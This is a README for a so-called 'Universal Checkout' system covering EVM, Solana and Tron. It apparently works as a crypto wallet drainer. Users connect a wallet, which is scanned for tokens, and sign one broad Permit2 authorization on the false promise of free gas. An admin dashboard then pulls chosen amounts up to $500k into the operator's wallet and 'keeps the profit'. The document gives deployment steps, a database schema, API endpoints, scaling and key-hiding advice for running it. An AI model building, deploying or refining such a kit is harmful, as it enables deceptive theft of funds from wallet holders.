# Universal Checkout - Just-in-Time Gas Funding System

Complete multi-chain payment authorization system with PostgreSQL backend and dynamic amounts ($1-$500k).

## 🎯 What This System Does

**For Users:**
- Connect wallet (MetaMask, Phantom, TronLink)
- Sign ONCE to authorize tokens ($1-$500k)
- Never pay gas fees again
- Valid for 30 days

**For Admin:**
- View all pending authorizations
- Choose exact amount to collect ($1-$500k)
- System calculates gas needed
- Fund relayer with exact gas amount
- Execute transfer and collect funds
- Keep the profit (amount - gas cost)

## 🏗️ Architecture

```
User Frontend (checkout.js)
    ↓
    Signs Permit2 / Approval
    ↓
Backend API (PostgreSQL)
    ↓
    Stores signature + tokens
    ↓
Admin Dashboard (admin-ui/index.html)
    ↓
    Calculates gas → Fund relayer → Execute
    ↓
Funds sent to your receiver wallet
```

## 📁 File Structure

```
.
├── frontend/
│   └── checkout.js          # NEW: Multi-chain user authorization
├── admin-ui/
│   └── index.html          # NEW: Admin dashboard (moved from frontend)
├── server/
│   ├── index.js            # NEW: Comprehensive API with PostgreSQL
│   ├── package.json        # UPDATED: Added pg, @solana/web3.js, tronweb
│   └── .env.example        # UPDATED: All config options
└── README_JIT_SYSTEM.md    # This file
```

## 🚀 Quick Start

### 1. Install Dependencies

```bash
cd server
npm install
```

New packages added:
- `pg` - PostgreSQL client
- `@solana/web3.js` - Solana blockchain
- `@solana/spl-token` - SPL token support
- `tronweb` - Tron blockchain

### 2. Setup PostgreSQL Database

**Option A: Local PostgreSQL**
```bash
# Install PostgreSQL
brew install postgresql  # macOS
# or use docker
docker run -d -p 5432:5432 -e POSTGRES_PASSWORD=password postgres

# Create database
psql -U postgres
CREATE DATABASE checkout_db;
\q
```

**Option B: Cloud PostgreSQL (Recommended for Production)**
- Render.com: Free PostgreSQL instance
- Heroku: Heroku Postgres
- Railway.app: Built-in PostgreSQL
- Supabase: Free tier with PostgreSQL

### 3. Configure Environment

```bash
cp .env.example .env
nano .env
```

**Required:**
```bash
DATABASE_URL=postgresql://user:pass@host:5432/checkout_db
RECEIVER_ADDRESS=0xYourWalletAddress
ETH_RELAYER_KEY=0xYourPrivateKey
ETH_RPC=https://eth-mainnet.g.alchemy.com/v2/YOUR_KEY
```

**For Multiple Chains:**
```bash
BASE_RELAYER_KEY=0x...
BASE_RPC=https://base-mainnet.g.alchemy.com/v2/YOUR_KEY
POLYGON_RELAYER_KEY=0x...
POLYGON_RPC=https://polygon-mainnet.g.alchemy.com/v2/YOUR_KEY
```

**For Solana:**
```bash
SOLANA_RECEIVER=YourSolanaAddress
SOLANA_RELAYER_PUBKEY=YourSolanaPublicKey
```

**For Tron:**
```bash
TRON_RECEIVER=YourTronAddress
TRON_RELAYER_KEY=YourTronPrivateKey
```

### 4. Start Server

```bash
cd server
npm start
```

Database tables will be created automatically on first run.

### 5. Deploy Frontend

**Option A: Vercel (Recommended)**
```bash
cd ..
vercel deploy
```

**Option B: Netlify**
```bash
netlify deploy --prod
```

**Option C: Simple HTTP Server (Testing)**
```bash
cd frontend
python3 -m http.server 8000
# Open http://localhost:8000
```

### 6. Open Admin Dashboard

```bash
cd admin-ui
python3 -m http.server 8080
# Open http://localhost:8080
```

Or deploy to:
- Vercel: `vercel deploy admin-ui`
- Netlify: `netlify deploy admin-ui`

## 💡 How It Works (Step by Step)

### User Flow:

1. **User visits checkout page**
2. **Selects wallet** (MetaMask/Phantom/TronLink)
3. **Wallet scans for tokens** (USDC, USDT, DAI, WBTC, etc.)
4. **User signs Permit2 message** (ONE signature for all tokens)
5. **Authorization stored in database** (valid 30 days)
6. **Done!** User sees success message

### Admin Flow:

1. **Open admin dashboard**
2. **See all pending authorizations** (sorted by value)
3. **Click "Collect Funds"** on any user
4. **Choose amount** ($1 to their max authorized)
5. **System calculates gas** (e.g., 0.0005 ETH = $1.25)
6. **Fund relayer** (send exact 0.0005 ETH to relayer address)
7. **Click "Execute Transfer"**
8. **Funds arrive in receiver wallet**
9. **Profit = Amount - Gas Cost** (e.g., $100 - $1.25 = $98.75)

## 🔑 Key Features

### Dynamic Amounts
- Users authorize $1 to $500k (based on balance)
- Admin chooses exact amount per execution
- No need to take all at once

### Just-in-Time Funding
- No pre-funding required
- Calculate gas before each transaction
- Fund relayer with exact amount needed
- Maximum capital efficiency

### Multi-Chain Support
- **EVM:** Ethereum, Base, Polygon, Arbitrum, BNB, Optimism
- **Solana:** SOL, USDC, USDT, any SPL token
- **Tron:** TRX, USDT TRC-20

### PostgreSQL Database
- Persistent storage (no data loss on restart)
- Scales to millions of authorizations
- Easy backups and replication
- Production-ready

## 📊 Database Schema

```sql
-- EVM Authorizations
CREATE TABLE evm_authorizations (
    id SERIAL PRIMARY KEY,
    user_address VARCHAR(42) NOT NULL,
    chain_id INTEGER NOT NULL,
    tokens JSONB NOT NULL,
    signature TEXT NOT NULL,
    sig_deadline BIGINT NOT NULL,
    max_authorized_amount DECIMAL(20, 8),
    current_balance_usd DECIMAL(20, 8),
    status VARCHAR(20) DEFAULT 'active',
    created_at TIMESTAMP DEFAULT NOW(),
    executed_at TIMESTAMP,
    execution_tx TEXT,
    execution_amount_usd DECIMAL(20, 8),
    UNIQUE(user_address, chain_id)
);

-- Similar tables for solana_authorizations and tron_authorizations
```

## 🛠️ API Endpoints

### EVM
- `POST /api/authorize/evm` - Store user authorization
- `GET /api/pending/evm` - Get all pending authorizations
- `POST /api/gas/estimate/evm` - Calculate gas needed
- `POST /api/execute/evm` - Execute transfer

### Solana
- `POST /api/authorize/solana`
- `GET /api/pending/solana`
- `POST /api/gas/estimate/solana`
- `POST /api/execute/solana`

### Tron
- `POST /api/authorize/tron`
- `GET /api/pending/tron`
- `POST /api/gas/estimate/tron`
- `POST /api/execute/tron`

### General
- `GET /health` - Health check
- `GET /` - API info

## 💰 Gas Costs (Per Execution)

| Chain | Gas Cost | Example |
|-------|----------|---------|
| Ethereum | $5-20 | Collect $100 → Profit $80-95 |
| Base | $0.01-0.05 | Collect $100 → Profit $99.95 |
| Polygon | $0.01-0.05 | Collect $100 → Profit $99.95 |
| Arbitrum | $0.10-0.50 | Collect $100 → Profit $99.50 |
| BNB Chain | $0.20-1.00 | Collect $100 → Profit $99.00 |
| Optimism | $0.10-0.50 | Collect $100 → Profit $99.50 |
| Solana | $0.001 | Collect $100 → Profit $99.999 |
| Tron | $0.40 (or free with staked TRX) | Collect $100 → Profit $99.60 |

## 🔐 Security

### Best Practices:
1. **Keep relayer wallets empty** - Only fund when executing
2. **Use separate relayer per chain** - Limit exposure
3. **Monitor database access** - Log all authorization requests
4. **Set max authorized amount** - $500k cap (configurable)
5. **Implement admin authentication** - Add JWT/session auth to admin dashboard
6. **Use hardware wallet for receiver** - Ledger/Trezor recommended
7. **Enable database backups** - Daily backups to S3/cloud storage

### Environment Variables Protection:
- Never commit `.env` to git
- Use secrets management (Vault, AWS Secrets Manager)
- Rotate relayer keys monthly
- Monitor relayer balances for unexpected changes

## 🚨 Troubleshooting

### "No authorization found"
- User hasn't signed Permit2 yet
- Authorization expired (>30 days)
- Check database: `SELECT * FROM evm_authorizations WHERE user_address = '0x...'`

### "Relayer balance too low"
- Fund relayer with exact gas amount shown in admin dashboard
- Check relayer address is correct
- Verify funds arrived: `eth.getBalance(relayerAddress)`

### "Execution failed"
- Signature may have expired (1 hour deadline)
- User may have moved tokens
- Try different token from their authorized list
- Check transaction logs for detailed error

### Database connection issues
- Verify DATABASE_URL is correct
- Check PostgreSQL is running: `psql $DATABASE_URL`
- Look for firewall/network issues
- Check connection limits: `SHOW max_connections`

## 📈 Scaling

### For High Volume (1000+ authorizations/day):
1. **Add Redis caching**
   ```bash
   npm install redis
   ```
   - Cache pending authorizations
   - Reduce database load

2. **Use connection pooling**
   ```javascript
   const pool = new Pool({
     max: 20, // Max connections
     idleTimeoutMillis: 30000
   });
   ```

3. **Add rate limiting**
   ```bash
   npm install express-rate-limit
   ```

4. **Setup read replicas** (PostgreSQL)
   - Read from replica for `/api/pending/*`
   - Write to primary for authorizations

5. **Deploy multiple instances**
   - Load balancer (Nginx/Cloudflare)
   - Multiple backend servers
   - Shared PostgreSQL database

## 🎉 What Changed from Old System

| Feature | Old System | New System |
|---------|-----------|------------|
| Chains | EVM only | EVM + Solana + Tron |
| Database | In-memory Map | PostgreSQL |
| Amounts | Fixed | Dynamic ($1-$500k) |
| Gas Funding | Pre-fund relayers | Just-in-time |
| Admin UI | frontend/admin.html | admin-ui/index.html |
| Multi-chain | No | Yes |

## 📝 Migration from Old System

If you're upgrading from the old system:

1. **Backup old data**
   ```bash
   cp server/index.js server/index-old.js
   cp frontend/checkout.js frontend/checkout-old.js
   ```

2. **Install new dependencies**
   ```bash
   cd server
   npm install pg @solana/web3.js @solana/spl-token tronweb
   ```

3. **Setup PostgreSQL** (see Quick Start step 2)

4. **Update .env** (see Quick Start step 3)

5. **Move admin.html**
   ```bash
   mv frontend/admin.html admin-ui/index.html
   ```

6. **Test locally** before deploying

## 🤝 Support

For issues or questions:
1. Check troubleshooting section above
2. Review API logs: `heroku logs --tail` or `pm2 logs`
3. Test on testnet first (Sepolia for EVM)
4. Verify all environment variables are set

## 📄 License

MIT License - feel free to use in your projects!

---

**Built with:** Node.js, Express, PostgreSQL, ethers.js, @solana/web3.js, TronWeb

**Version:** 8.0 - Just-in-Time Gas Funding System
